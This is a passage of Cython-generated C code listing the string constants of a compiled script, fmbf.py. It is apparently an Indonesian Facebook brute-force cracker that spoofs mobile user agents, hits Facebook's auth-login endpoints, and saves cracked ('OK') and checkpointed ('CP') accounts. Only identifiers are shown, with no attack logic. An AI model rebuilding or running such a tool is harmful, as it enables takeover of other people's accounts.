  {&__pyx_n_s_Crack_simpan_hasil, __pyx_k_Crack_simpan_hasil, sizeof(__pyx_k_Crack_simpan_hasil), 0, 0, 1, 1},
  {&__pyx_kp_u_CriOS, __pyx_k_CriOS, sizeof(__pyx_k_CriOS), 0, 1, 0, 0},
  {&__pyx_kp_s_CriOS_Mobile, __pyx_k_CriOS_Mobile, sizeof(__pyx_k_CriOS_Mobile), 0, 0, 1, 0},
  {&__pyx_n_s_D, __pyx_k_D, sizeof(__pyx_k_D), 0, 0, 1, 1},
  {&__pyx_n_s_DEFAULT, __pyx_k_DEFAULT, sizeof(__pyx_k_DEFAULT), 0, 0, 1, 1},
  {&__pyx_n_s_Default, __pyx_k_Default, sizeof(__pyx_k_Default), 0, 0, 1, 1},
  {&__pyx_n_s_E, __pyx_k_E, sizeof(__pyx_k_E), 0, 0, 1, 1},
  {&__pyx_n_s_EAA, __pyx_k_EAA, sizeof(__pyx_k_EAA), 0, 0, 1, 1},
  {&__pyx_n_s_EXCELLENT, __pyx_k_EXCELLENT, sizeof(__pyx_k_EXCELLENT), 0, 0, 1, 1},
  {&__pyx_n_s_F, __pyx_k_F, sizeof(__pyx_k_F), 0, 0, 1, 1},
  {&__pyx_kp_u_FBAN_MessengerForiOS_FBAV_112_0, __pyx_k_FBAN_MessengerForiOS_FBAV_112_0, sizeof(__pyx_k_FBAN_MessengerForiOS_FBAV_112_0), 0, 1, 0, 0},
  {&__pyx_kp_u_FBBV_54364624_FBDV_iPhone5_1_FB, __pyx_k_FBBV_54364624_FBDV_iPhone5_1_FB, sizeof(__pyx_k_FBBV_54364624_FBDV_iPhone5_1_FB), 0, 1, 0, 0},
  {&__pyx_kp_u_FBSS_2_FBCR_T_Mobile_FBID_phone, __pyx_k_FBSS_2_FBCR_T_Mobile_FBID_phone, sizeof(__pyx_k_FBSS_2_FBCR_T_Mobile_FBID_phone), 0, 1, 0, 0},
  {&__pyx_n_s_G, __pyx_k_G, sizeof(__pyx_k_G), 0, 0, 1, 1},
  {&__pyx_kp_s_Github_https_github_com_Fall_Xa, __pyx_k_Github_https_github_com_Fall_Xa, sizeof(__pyx_k_Github_https_github_com_Fall_Xa), 0, 0, 1, 0},
  {&__pyx_n_s_H, __pyx_k_H, sizeof(__pyx_k_H), 0, 0, 1, 1},
  {&__pyx_n_s_Host, __pyx_k_Host, sizeof(__pyx_k_Host), 0, 0, 1, 1},
  {&__pyx_n_s_I, __pyx_k_I, sizeof(__pyx_k_I), 0, 0, 1, 1},
  {&__pyx_kp_u_IP, __pyx_k_IP, sizeof(__pyx_k_IP), 0, 1, 0, 0},
  {&__pyx_n_s_J, __pyx_k_J, sizeof(__pyx_k_J), 0, 0, 1, 1},
  {&__pyx_n_s_K, __pyx_k_K, sizeof(__pyx_k_K), 0, 0, 1, 1},
  {&__pyx_kp_u_KHTML_like_Gecko_Mobile, __pyx_k_KHTML_like_Gecko_Mobile, sizeof(__pyx_k_KHTML_like_Gecko_Mobile), 0, 1, 0, 0},
  {&__pyx_n_s_L, __pyx_k_L, sizeof(__pyx_k_L), 0, 0, 1, 1},
  {&__pyx_n_s_Liger, __pyx_k_Liger, sizeof(__pyx_k_Liger), 0, 0, 1, 1},
  {&__pyx_n_s_M, __pyx_k_M, sizeof(__pyx_k_M), 0, 0, 1, 1},
  {&__pyx_n_s_Main, __pyx_k_Main, sizeof(__pyx_k_Main), 0, 0, 1, 1},
  {&__pyx_n_s_Main___init, __pyx_k_Main___init, sizeof(__pyx_k_Main___init), 0, 0, 1, 1},
  {&__pyx_n_s_Main_cek_result, __pyx_k_Main_cek_result, sizeof(__pyx_k_Main_cek_result), 0, 0, 1, 1},
  {&__pyx_n_s_Main_login, __pyx_k_Main_login, sizeof(__pyx_k_Main_login), 0, 0, 1, 1},
  {&__pyx_n_s_Main_logo, __pyx_k_Main_logo, sizeof(__pyx_k_Main_logo), 0, 0, 1, 1},
  {&__pyx_n_s_Main_menu, __pyx_k_Main_menu, sizeof(__pyx_k_Main_menu), 0, 0, 1, 1},
  {&__pyx_n_s_Main_publik, __pyx_k_Main_publik, sizeof(__pyx_k_Main_publik), 0, 0, 1, 1},
  {&__pyx_n_s_Main_set_ugent, __pyx_k_Main_set_ugent, sizeof(__pyx_k_Main_set_ugent), 0, 0, 1, 1},
  {&__pyx_kp_u_Mobile, __pyx_k_Mobile, sizeof(__pyx_k_Mobile), 0, 1, 0, 0},
  {&__pyx_kp_s_Mozilla_5_0_Linux_Android, __pyx_k_Mozilla_5_0_Linux_Android, sizeof(__pyx_k_Mozilla_5_0_Linux_Android), 0, 0, 1, 0},
  {&__pyx_kp_s_Mozilla_5_0_Linux_Android_11_AC2, __pyx_k_Mozilla_5_0_Linux_Android_11_AC2, sizeof(__pyx_k_Mozilla_5_0_Linux_Android_11_AC2), 0, 0, 1, 0},
  {&__pyx_kp_u_Mozilla_5_0_Linux_Android_2, __pyx_k_Mozilla_5_0_Linux_Android_2, sizeof(__pyx_k_Mozilla_5_0_Linux_Android_2), 0, 1, 0, 0},
  {&__pyx_kp_s_Mozilla_5_0_Linux_U_Android, __pyx_k_Mozilla_5_0_Linux_U_Android, sizeof(__pyx_k_Mozilla_5_0_Linux_U_Android), 0, 0, 1, 0},
  {&__pyx_kp_s_Mozilla_5_0_iPad, __pyx_k_Mozilla_5_0_iPad, sizeof(__pyx_k_Mozilla_5_0_iPad), 0, 0, 1, 0},
  {&__pyx_kp_s_Mozilla_5_0_iPhone, __pyx_k_Mozilla_5_0_iPhone, sizeof(__pyx_k_Mozilla_5_0_iPhone), 0, 0, 1, 0},
  {&__pyx_kp_u_Mozilla_5_0_iPhone_CPU_iPhone_OS, __pyx_k_Mozilla_5_0_iPhone_CPU_iPhone_OS, sizeof(__pyx_k_Mozilla_5_0_iPhone_CPU_iPhone_OS), 0, 1, 0, 0},
  {&__pyx_n_s_N, __pyx_k_N, sizeof(__pyx_k_N), 0, 0, 1, 1},
  {&__pyx_kp_s_Nexus_5X_Build_MMB29K, __pyx_k_Nexus_5X_Build_MMB29K, sizeof(__pyx_k_Nexus_5X_Build_MMB29K), 0, 0, 1, 0},
  {&__pyx_kp_s_Nexus_5X_Build_N4F26T, __pyx_k_Nexus_5X_Build_N4F26T, sizeof(__pyx_k_Nexus_5X_Build_N4F26T), 0, 0, 1, 0},
  {&__pyx_kp_s_Nexus_5X_Build_OPM6_171019_030_H, __pyx_k_Nexus_5X_Build_OPM6_171019_030_H, sizeof(__pyx_k_Nexus_5X_Build_OPM6_171019_030_H), 0, 0, 1, 0},
  {&__pyx_kp_s_Nexus_5X_Build_OPR6_170623_023, __pyx_k_Nexus_5X_Build_OPR6_170623_023, sizeof(__pyx_k_Nexus_5X_Build_OPR6_170623_023), 0, 0, 1, 0},
  {&__pyx_kp_s_Nexus_5_Build_NHG47L, __pyx_k_Nexus_5_Build_NHG47L, sizeof(__pyx_k_Nexus_5_Build_NHG47L), 0, 0, 1, 0},
  {&__pyx_kp_s_Nexus_6P_Build_OPM5_171019_014, __pyx_k_Nexus_6P_Build_OPM5_171019_014, sizeof(__pyx_k_Nexus_6P_Build_OPM5_171019_014), 0, 0, 1, 0},
  {&__pyx_kp_s_Nexus_6_Build_OPM5_171019_015, __pyx_k_Nexus_6_Build_OPM5_171019_015, sizeof(__pyx_k_Nexus_6_Build_OPM5_171019_015), 0, 0, 1, 0},
  {&__pyx_kp_s_Nexus_7_Build_LMY47V, __pyx_k_Nexus_7_Build_LMY47V, sizeof(__pyx_k_Nexus_7_Build_LMY47V), 0, 0, 1, 0},
  {&__pyx_kp_s_Not_A_Brand_v_99_Chromium_v_101, __pyx_k_Not_A_Brand_v_99_Chromium_v_101, sizeof(__pyx_k_Not_A_Brand_v_99_Chromium_v_101), 0, 0, 1, 0},
  {&__pyx_n_s_O, __pyx_k_O, sizeof(__pyx_k_O), 0, 0, 1, 1},
  {&__pyx_n_s_OK, __pyx_k_OK, sizeof(__pyx_k_OK), 0, 0, 1, 1},
  {&__pyx_kp_u_OK_2, __pyx_k_OK_2, sizeof(__pyx_k_OK_2), 0, 1, 0, 0},
  {&__pyx_kp_u_OK_3, __pyx_k_OK_3, sizeof(__pyx_k_OK_3), 0, 1, 0, 0},
  {&__pyx_n_s_P, __pyx_k_P, sizeof(__pyx_k_P), 0, 0, 1, 1},
  {&__pyx_n_u_Premium, __pyx_k_Premium, sizeof(__pyx_k_Premium), 0, 1, 0, 1},
  {&__pyx_n_s_Q, __pyx_k_Q, sizeof(__pyx_k_Q), 0, 0, 1, 1},
  {&__pyx_n_s_R, __pyx_k_R, sizeof(__pyx_k_R), 0, 0, 1, 1},
  {&__pyx_n_s_S, __pyx_k_S, sizeof(__pyx_k_S), 0, 0, 1, 1},
  {&__pyx_n_s_Session, __pyx_k_Session, sizeof(__pyx_k_Session), 0, 0, 1, 1},
  {&__pyx_kp_u_Status, __pyx_k_Status, sizeof(__pyx_k_Status), 0, 1, 0, 0},
  {&__pyx_n_s_T, __pyx_k_T, sizeof(__pyx_k_T), 0, 0, 1, 1},
  {&__pyx_n_s_ThreadPoolExecutor, __pyx_k_ThreadPoolExecutor, sizeof(__pyx_k_ThreadPoolExecutor), 0, 0, 1, 1},
  {&__pyx_n_s_U, __pyx_k_U, sizeof(__pyx_k_U), 0, 0, 1, 1},
  {&__pyx_kp_s_User_must_verify_their_account, __pyx_k_User_must_verify_their_account, sizeof(__pyx_k_User_must_verify_their_account), 0, 0, 1, 0},
  {&__pyx_kp_s_User_must_verify_their_account_o, __pyx_k_User_must_verify_their_account_o, sizeof(__pyx_k_User_must_verify_their_account_o), 0, 0, 1, 0},
  {&__pyx_n_s_V, __pyx_k_V, sizeof(__pyx_k_V), 0, 0, 1, 1},
  {&__pyx_n_s_W, __pyx_k_W, sizeof(__pyx_k_W), 0, 0, 1, 1},
  {&__pyx_n_s_X, __pyx_k_X, sizeof(__pyx_k_X), 0, 0, 1, 1},
  {&__pyx_n_s_XMLHttpRequest, __pyx_k_XMLHttpRequest, sizeof(__pyx_k_XMLHttpRequest), 0, 0, 1, 1},
  {&__pyx_n_s_Y, __pyx_k_Y, sizeof(__pyx_k_Y), 0, 0, 1, 1},
  {&__pyx_n_s_Z, __pyx_k_Z, sizeof(__pyx_k_Z), 0, 0, 1, 1},
  {&__pyx_kp_u__13, __pyx_k__13, sizeof(__pyx_k__13), 0, 1, 0, 0},
  {&__pyx_kp_u__17, __pyx_k__17, sizeof(__pyx_k__17), 0, 1, 0, 0},
  {&__pyx_kp_s__2, __pyx_k__2, sizeof(__pyx_k__2), 0, 0, 1, 0},
  {&__pyx_kp_u__2, __pyx_k__2, sizeof(__pyx_k__2), 0, 1, 0, 0},
  {&__pyx_kp_s__21, __pyx_k__21, sizeof(__pyx_k__21), 0, 0, 1, 0},
  {&__pyx_kp_s__23, __pyx_k__23, sizeof(__pyx_k__23), 0, 0, 1, 0},
  {&__pyx_kp_u__24, __pyx_k__24, sizeof(__pyx_k__24), 0, 1, 0, 0},
  {&__pyx_kp_s__25, __pyx_k__25, sizeof(__pyx_k__25), 0, 0, 1, 0},
  {&__pyx_kp_s__32, __pyx_k__32, sizeof(__pyx_k__32), 0, 0, 1, 0},
  {&__pyx_n_s__36, __pyx_k__36, sizeof(__pyx_k__36), 0, 0, 1, 1},
  {&__pyx_kp_s__39, __pyx_k__39, sizeof(__pyx_k__39), 0, 0, 1, 0},
  {&__pyx_kp_u__39, __pyx_k__39, sizeof(__pyx_k__39), 0, 1, 0, 0},
  {&__pyx_kp_s__4, __pyx_k__4, sizeof(__pyx_k__4), 0, 0, 1, 0},
  {&__pyx_kp_u__42, __pyx_k__42, sizeof(__pyx_k__42), 0, 1, 0, 0},
  {&__pyx_kp_u__46, __pyx_k__46, sizeof(__pyx_k__46), 0, 1, 0, 0},
  {&__pyx_kp_s__48, __pyx_k__48, sizeof(__pyx_k__48), 0, 0, 1, 0},
  {&__pyx_kp_u__48, __pyx_k__48, sizeof(__pyx_k__48), 0, 1, 0, 0},
  {&__pyx_kp_s__58, __pyx_k__58, sizeof(__pyx_k__58), 0, 0, 1, 0},
  {&__pyx_kp_s__61, __pyx_k__61, sizeof(__pyx_k__61), 0, 0, 1, 0},
  {&__pyx_kp_u__62, __pyx_k__62, sizeof(__pyx_k__62), 0, 1, 0, 0},
  {&__pyx_kp_s__68, __pyx_k__68, sizeof(__pyx_k__68), 0, 0, 1, 0},
  {&__pyx_kp_u__69, __pyx_k__69, sizeof(__pyx_k__69), 0, 1, 0, 0},
  {&__pyx_kp_u__70, __pyx_k__70, sizeof(__pyx_k__70), 0, 1, 0, 0},
  {&__pyx_kp_u__71, __pyx_k__71, sizeof(__pyx_k__71), 0, 1, 0, 0},
  {&__pyx_kp_u__72, __pyx_k__72, sizeof(__pyx_k__72), 0, 1, 0, 0},
  {&__pyx_kp_u__73, __pyx_k__73, sizeof(__pyx_k__73), 0, 1, 0, 0},
  {&__pyx_kp_u__74, __pyx_k__74, sizeof(__pyx_k__74), 0, 1, 0, 0},
  {&__pyx_kp_s__75, __pyx_k__75, sizeof(__pyx_k__75), 0, 0, 1, 0},
  {&__pyx_n_s_a, __pyx_k_a, sizeof(__pyx_k_a), 0, 0, 1, 1},
  {&__pyx_n_s_accept, __pyx_k_accept, sizeof(__pyx_k_accept), 0, 0, 1, 1},
  {&__pyx_kp_s_accept_encoding, __pyx_k_accept_encoding, sizeof(__pyx_k_accept_encoding), 0, 0, 1, 0},
  {&__pyx_kp_s_accept_language, __pyx_k_accept_language, sizeof(__pyx_k_accept_language), 0, 0, 1, 0},
  {&__pyx_kp_s_accessToken, __pyx_k_accessToken, sizeof(__pyx_k_accessToken), 0, 0, 1, 0},
  {&__pyx_n_s_access_token, __pyx_k_access_token, sizeof(__pyx_k_access_token), 0, 0, 1, 1},
  {&__pyx_kp_s_act_nav_source, __pyx_k_act_nav_source, sizeof(__pyx_k_act_nav_source), 0, 0, 1, 0},
  {&__pyx_n_s_after, __pyx_k_after, sizeof(__pyx_k_after), 0, 0, 1, 1},
  {&__pyx_n_s_allow_redirects, __pyx_k_allow_redirects, sizeof(__pyx_k_allow_redirects), 0, 0, 1, 1},
  {&__pyx_kp_s_anda_bisa_mematikan_data_selula, __pyx_k_anda_bisa_mematikan_data_selula, sizeof(__pyx_k_anda_bisa_mematikan_data_selula), 0, 0, 1, 0},
  {&__pyx_n_s_android, __pyx_k_android, sizeof(__pyx_k_android), 0, 0, 1, 1},
  {&__pyx_n_s_anj, __pyx_k_anj, sizeof(__pyx_k_anj), 0, 0, 1, 1},
  {&__pyx_n_s_api, __pyx_k_api, sizeof(__pyx_k_api), 0, 0, 1, 1},
  {&__pyx_n_s_append, __pyx_k_append, sizeof(__pyx_k_append), 0, 0, 1, 1},
  {&__pyx_kp_s_application_x_www_form_urlencode, __pyx_k_application_x_www_form_urlencode, sizeof(__pyx_k_application_x_www_form_urlencode), 0, 0, 1, 0},
  {&__pyx_n_s_args, __pyx_k_args, sizeof(__pyx_k_args), 0, 0, 1, 1},
  {&__pyx_n_s_ask, __pyx_k_ask, sizeof(__pyx_k_ask), 0, 0, 1, 1},
  {&__pyx_n_s_atursandi, __pyx_k_atursandi, sizeof(__pyx_k_atursandi), 0, 0, 1, 1},
  {&__pyx_n_s_az, __pyx_k_az, sizeof(__pyx_k_az), 0, 0, 1, 1},
  {&__pyx_kp_u_berhasil_generate, __pyx_k_berhasil_generate, sizeof(__pyx_k_berhasil_generate), 0, 1, 0, 0},
  {&__pyx_kp_s_berhasil_mengecek_total_len_fil, __pyx_k_berhasil_mengecek_total_len_fil, sizeof(__pyx_k_berhasil_mengecek_total_len_fil), 0, 0, 1, 0},
  {&__pyx_kp_s_berhasil_mengembalikan_useragen, __pyx_k_berhasil_mengembalikan_useragen, sizeof(__pyx_k_berhasil_mengembalikan_useragen), 0, 0, 1, 0},
  {&__pyx_kp_s_berhasil_menghapus_login, __pyx_k_berhasil_menghapus_login, sizeof(__pyx_k_berhasil_menghapus_login), 0, 0, 1, 0},
  {&__pyx_n_s_bs4, __pyx_k_bs4, sizeof(__pyx_k_bs4), 0, 0, 1, 1},
  {&__pyx_n_s_build, __pyx_k_build, sizeof(__pyx_k_build), 0, 0, 1, 1},
  {&__pyx_n_s_build_device, __pyx_k_build_device, sizeof(__pyx_k_build_device), 0, 0, 1, 1},
  {&__pyx_n_s_c_user, __pyx_k_c_user, sizeof(__pyx_k_c_user), 0, 0, 1, 1},
  {&__pyx_kp_s_cache_control, __pyx_k_cache_control, sizeof(__pyx_k_cache_control), 0, 0, 1, 0},
  {&__pyx_n_s_cek_result, __pyx_k_cek_result, sizeof(__pyx_k_cek_result), 0, 0, 1, 1},
  {&__pyx_n_s_check_output, __pyx_k_check_output, sizeof(__pyx_k_check_output), 0, 0, 1, 1},
  {&__pyx_n_s_checkpoint, __pyx_k_checkpoint, sizeof(__pyx_k_checkpoint), 0, 0, 1, 1},
  {&__pyx_n_s_choice, __pyx_k_choice, sizeof(__pyx_k_choice), 0, 0, 1, 1},
  {&__pyx_n_s_clear, __pyx_k_clear, sizeof(__pyx_k_clear), 0, 0, 1, 1},
  {&__pyx_n_s_cline_in_traceback, __pyx_k_cline_in_traceback, sizeof(__pyx_k_cline_in_traceback), 0, 0, 1, 1},
  {&__pyx_n_s_close, __pyx_k_close, sizeof(__pyx_k_close), 0, 0, 1, 1},
  {&__pyx_n_s_cok, __pyx_k_cok, sizeof(__pyx_k_cok), 0, 0, 1, 1},
  {&__pyx_n_s_concurrent_futures, __pyx_k_concurrent_futures, sizeof(__pyx_k_concurrent_futures), 0, 0, 1, 1},
  {&__pyx_n_s_connection, __pyx_k_connection, sizeof(__pyx_k_connection), 0, 0, 1, 1},
  {&__pyx_kp_s_content_length, __pyx_k_content_length, sizeof(__pyx_k_content_length), 0, 0, 1, 0},
  {&__pyx_kp_s_content_type, __pyx_k_content_type, sizeof(__pyx_k_content_type), 0, 0, 1, 0},
  {&__pyx_n_s_cookie, __pyx_k_cookie, sizeof(__pyx_k_cookie), 0, 0, 1, 1},
  {&__pyx_kp_s_cookie_invalid, __pyx_k_cookie_invalid, sizeof(__pyx_k_cookie_invalid), 0, 0, 1, 0},
  {&__pyx_kp_s_cookie_txt, __pyx_k_cookie_txt, sizeof(__pyx_k_cookie_txt), 0, 0, 1, 0},
  {&__pyx_n_s_cookies, __pyx_k_cookies, sizeof(__pyx_k_cookies), 0, 0, 1, 1},
  {&__pyx_n_s_cors, __pyx_k_cors, sizeof(__pyx_k_cors), 0, 0, 1, 1},
  {&__pyx_n_s_cp, __pyx_k_cp, sizeof(__pyx_k_cp), 0, 0, 1, 1},
  {&__pyx_kp_u_crack, __pyx_k_crack, sizeof(__pyx_k_crack), 0, 1, 0, 0},
  {&__pyx_kp_s_crack_selesai, __pyx_k_crack_selesai, sizeof(__pyx_k_crack_selesai), 0, 0, 1, 0},
  {&__pyx_n_s_cursors, __pyx_k_cursors, sizeof(__pyx_k_cursors), 0, 0, 1, 1},
  {&__pyx_kp_s_d_B_Y, __pyx_k_d_B_Y, sizeof(__pyx_k_d_B_Y), 0, 0, 1, 0},
  {&__pyx_n_s_data, __pyx_k_data, sizeof(__pyx_k_data), 0, 0, 1, 1},
  {&__pyx_kp_s_data_cookie_txt, __pyx_k_data_cookie_txt, sizeof(__pyx_k_data_cookie_txt), 0, 0, 1, 0},
  {&__pyx_kp_s_data_token_txt, __pyx_k_data_token_txt, sizeof(__pyx_k_data_token_txt), 0, 0, 1, 0},
  {&__pyx_kp_s_data_ugent, __pyx_k_data_ugent, sizeof(__pyx_k_data_ugent), 0, 0, 1, 0},
  {&__pyx_kp_u_data_ugent, __pyx_k_data_ugent, sizeof(__pyx_k_data_ugent), 0, 1, 0, 0},
  {&__pyx_n_s_date, __pyx_k_date, sizeof(__pyx_k_date), 0, 0, 1, 1},
  {&__pyx_n_s_datetime, __pyx_k_datetime, sizeof(__pyx_k_datetime), 0, 0, 1, 1},
  {&__pyx_n_s_decode, __pyx_k_decode, sizeof(__pyx_k_decode), 0, 0, 1, 1},
  {&__pyx_n_s_default, __pyx_k_default, sizeof(__pyx_k_default), 0, 0, 1, 1},
  {&__pyx_n_s_depan, __pyx_k_depan, sizeof(__pyx_k_depan), 0, 0, 1, 1},
  {&__pyx_n_s_dev, __pyx_k_dev, sizeof(__pyx_k_dev), 0, 0, 1, 1},
  {&__pyx_n_s_device, __pyx_k_device, sizeof(__pyx_k_device), 0, 0, 1, 1},
  {&__pyx_n_s_dirs, __pyx_k_dirs, sizeof(__pyx_k_dirs), 0, 0, 1, 1},
  {&__pyx_n_s_doc, __pyx_k_doc, sizeof(__pyx_k_doc), 0, 0, 1, 1},
  {&__pyx_n_s_email, __pyx_k_email, sizeof(__pyx_k_email), 0, 0, 1, 1},
  {&__pyx_n_s_empty, __pyx_k_empty, sizeof(__pyx_k_empty), 0, 0, 1, 1},
  {&__pyx_n_s_en_US, __pyx_k_en_US, sizeof(__pyx_k_en_US), 0, 0, 1, 1},
  {&__pyx_n_s_enter, __pyx_k_enter, sizeof(__pyx_k_enter), 0, 0, 1, 1},
  {&__pyx_n_s_error, __pyx_k_error, sizeof(__pyx_k_error), 0, 0, 1, 1},
  {&__pyx_n_s_exit, __pyx_k_exit, sizeof(__pyx_k_exit), 0, 0, 1, 1},
  {&__pyx_n_s_exit_2, __pyx_k_exit_2, sizeof(__pyx_k_exit_2), 0, 0, 1, 1},
  {&__pyx_n_s_fall, __pyx_k_fall, sizeof(__pyx_k_fall), 0, 0, 1, 1},
  {&__pyx_n_s_fields, __pyx_k_fields, sizeof(__pyx_k_fields), 0, 0, 1, 1},
  {&__pyx_n_s_fil, __pyx_k_fil, sizeof(__pyx_k_fil), 0, 0, 1, 1},
  {&__pyx_n_s_file, __pyx_k_file, sizeof(__pyx_k_file), 0, 0, 1, 1},
  {&__pyx_kp_s_file_tidak_ada, __pyx_k_file_tidak_ada, sizeof(__pyx_k_file_tidak_ada), 0, 0, 1, 0},
  {&__pyx_n_s_findall, __pyx_k_findall, sizeof(__pyx_k_findall), 0, 0, 1, 1},
  {&__pyx_n_s_flow, __pyx_k_flow, sizeof(__pyx_k_flow), 0, 0, 1, 1},
  {&__pyx_n_s_flush, __pyx_k_flush, sizeof(__pyx_k_flush), 0, 0, 1, 1},
  {&__pyx_n_s_fmbf, __pyx_k_fmbf, sizeof(__pyx_k_fmbf), 0, 0, 1, 1},
  {&__pyx_kp_s_fmbf_py, __pyx_k_fmbf_py, sizeof(__pyx_k_fmbf_py), 0, 0, 1, 0},
  {&__pyx_n_s_folder, __pyx_k_folder, sizeof(__pyx_k_folder), 0, 0, 1, 1},
  {&__pyx_n_s_friends, __pyx_k_friends, sizeof(__pyx_k_friends), 0, 0, 1, 1},
  {&__pyx_n_s_generate_session_cookies, __pyx_k_generate_session_cookies, sizeof(__pyx_k_generate_session_cookies), 0, 0, 1, 1},
  {&__pyx_n_s_genexpr, __pyx_k_genexpr, sizeof(__pyx_k_genexpr), 0, 0, 1, 1},
  {&__pyx_n_s_get, __pyx_k_get, sizeof(__pyx_k_get), 0, 0, 1, 1},
  {&__pyx_n_s_get_dict, __pyx_k_get_dict, sizeof(__pyx_k_get_dict), 0, 0, 1, 1},
  {&__pyx_kp_s_getprop_ro_build_id, __pyx_k_getprop_ro_build_id, sizeof(__pyx_k_getprop_ro_build_id), 0, 0, 1, 0},
  {&__pyx_kp_s_getprop_ro_product_model, __pyx_k_getprop_ro_product_model, sizeof(__pyx_k_getprop_ro_product_model), 0, 0, 1, 0},
  {&__pyx_kp_s_graph_facebook_com, __pyx_k_graph_facebook_com, sizeof(__pyx_k_graph_facebook_com), 0, 0, 1, 0},
  {&__pyx_n_s_group, __pyx_k_group, sizeof(__pyx_k_group), 0, 0, 1, 1},
  {&__pyx_kp_s_gunakan_untuk_pemisah_contoh_sa, __pyx_k_gunakan_untuk_pemisah_contoh_sa, sizeof(__pyx_k_gunakan_untuk_pemisah_contoh_sa), 0, 0, 1, 0},
  {&__pyx_kp_s_gzip_deflate, __pyx_k_gzip_deflate, sizeof(__pyx_k_gzip_deflate), 0, 0, 1, 0},
  {&__pyx_kp_s_gzip_deflate_br, __pyx_k_gzip_deflate_br, sizeof(__pyx_k_gzip_deflate_br), 0, 0, 1, 0},
  {&__pyx_n_s_hari_ini, __pyx_k_hari_ini, sizeof(__pyx_k_hari_ini), 0, 0, 1, 1},
  {&__pyx_kp_u_hasil_CP_disimpan_ke_CP, __pyx_k_hasil_CP_disimpan_ke_CP, sizeof(__pyx_k_hasil_CP_disimpan_ke_CP), 0, 1, 0, 0},
  {&__pyx_kp_u_hasil_OK_disimpan_ke_OK, __pyx_k_hasil_OK_disimpan_ke_OK, sizeof(__pyx_k_hasil_OK_disimpan_ke_OK), 0, 1, 0, 0},
  {&__pyx_n_s_headers, __pyx_k_headers, sizeof(__pyx_k_headers), 0, 0, 1, 1},
  {&__pyx_n_s_host, __pyx_k_host, sizeof(__pyx_k_host), 0, 0, 1, 1},
  {&__pyx_kp_s_http_ip_api_com_json, __pyx_k_http_ip_api_com_json, sizeof(__pyx_k_http_ip_api_com_json), 0, 0, 1, 0},
  {&__pyx_kp_u_https, __pyx_k_https, sizeof(__pyx_k_https), 0, 1, 0, 0},
  {&__pyx_kp_u_https_graph_facebook_com, __pyx_k_https_graph_facebook_com, sizeof(__pyx_k_https_graph_facebook_com), 0, 1, 0, 0},
  {&__pyx_kp_s_https_graph_facebook_com_auth_lo, __pyx_k_https_graph_facebook_com_auth_lo, sizeof(__pyx_k_https_graph_facebook_com_auth_lo), 0, 0, 1, 0},
  {&__pyx_kp_u_https_graph_facebook_com_me_acce, __pyx_k_https_graph_facebook_com_me_acce, sizeof(__pyx_k_https_graph_facebook_com_me_acce), 0, 1, 0, 0},
  {&__pyx_kp_s_https_www_facebook_com_adsmanage, __pyx_k_https_www_facebook_com_adsmanage, sizeof(__pyx_k_https_www_facebook_com_adsmanage), 0, 0, 1, 0},
  {&__pyx_kp_u_https_www_facebook_com_adsmanage_2, __pyx_k_https_www_facebook_com_adsmanage_2, sizeof(__pyx_k_https_www_facebook_com_adsmanage_2), 0, 1, 0, 0},
  {&__pyx_n_s_i, __pyx_k_i, sizeof(__pyx_k_i), 0, 0, 1, 1},
  {&__pyx_n_s_id, __pyx_k_id, sizeof(__pyx_k_id), 0, 0, 1, 1},
  {&__pyx_kp_u_id_2, __pyx_k_id_2, sizeof(__pyx_k_id_2), 0, 1, 0, 0},
  {&__pyx_kp_s_id_ID_id_q_0_9, __pyx_k_id_ID_id_q_0_9, sizeof(__pyx_k_id_ID_id_q_0_9), 0, 0, 1, 0},
  {&__pyx_kp_s_id_ID_id_q_0_9_en_US_q_0_8_en_q, __pyx_k_id_ID_id_q_0_9_en_US_q_0_8_en_q, sizeof(__pyx_k_id_ID_id_q_0_9_en_US_q_0_8_en_q), 0, 0, 1, 0},
  {&__pyx_n_s_idz, __pyx_k_idz, sizeof(__pyx_k_idz), 0, 0, 1, 1},
  {&__pyx_n_s_import, __pyx_k_import, sizeof(__pyx_k_import), 0, 0, 1, 1},
  {&__pyx_n_s_init, __pyx_k_init, sizeof(__pyx_k_init), 0, 0, 1, 1},
  {&__pyx_n_s_input, __pyx_k_input, sizeof(__pyx_k_input), 0, 0, 1, 1},
  {&__pyx_n_s_insert, __pyx_k_insert, sizeof(__pyx_k_insert), 0, 0, 1, 1},
  {&__pyx_n_s_ip, __pyx_k_ip, sizeof(__pyx_k_ip), 0, 0, 1, 1},
  {&__pyx_kp_s_isi_me_jika_ingin_crack_dari_da, __pyx_k_isi_me_jika_ingin_crack_dari_da, sizeof(__pyx_k_isi_me_jika_ingin_crack_dari_da), 0, 0, 1, 0},
  {&__pyx_n_s_items, __pyx_k_items, sizeof(__pyx_k_items), 0, 0, 1, 1},
  {&__pyx_n_s_jazoest, __pyx_k_jazoest, sizeof(__pyx_k_jazoest), 0, 0, 1, 1},
  {&__pyx_n_s_join, __pyx_k_join, sizeof(__pyx_k_join), 0, 0, 1, 1},
  {&__pyx_n_s_json, __pyx_k_json, sizeof(__pyx_k_json), 0, 0, 1, 1},
  {&__pyx_kp_s_kata_sandi_minimal_6_karakter, __pyx_k_kata_sandi_minimal_6_karakter, sizeof(__pyx_k_kata_sandi_minimal_6_karakter), 0, 0, 1, 0},
  {&__pyx_kp_s_keep_alive, __pyx_k_keep_alive, sizeof(__pyx_k_keep_alive), 0, 0, 1, 0},
  {&__pyx_kp_s_ketik_myua_jika_ingin_ua_hp_sen, __pyx_k_ketik_myua_jika_ingin_ua_hp_sen, sizeof(__pyx_k_ketik_myua_jika_ingin_ua_hp_sen), 0, 0, 1, 0},
  {&__pyx_n_s_key, __pyx_k_key, sizeof(__pyx_k_key), 0, 0, 1, 1},
  {&__pyx_kp_u_like_Mac_OS_X_AppleWebKit, __pyx_k_like_Mac_OS_X_AppleWebKit, sizeof(__pyx_k_like_Mac_OS_X_AppleWebKit), 0, 1, 0, 0},
  {&__pyx_n_s_listdir, __pyx_k_listdir, sizeof(__pyx_k_listdir), 0, 0, 1, 1},
  {&__pyx_n_s_locale, __pyx_k_locale, sizeof(__pyx_k_locale), 0, 0, 1, 1},
  {&__pyx_n_s_login, __pyx_k_login, sizeof(__pyx_k_login), 0, 0, 1, 1},
  {&__pyx_kp_u_login_device_based_validate_pas, __pyx_k_login_device_based_validate_pas, sizeof(__pyx_k_login_device_based_validate_pas), 0, 1, 0, 0},
  {&__pyx_kp_u_login_next_ref_dbl_fl_login_fro, __pyx_k_login_next_ref_dbl_fl_login_fro, sizeof(__pyx_k_login_next_ref_dbl_fl_login_fro), 0, 1, 0, 0},
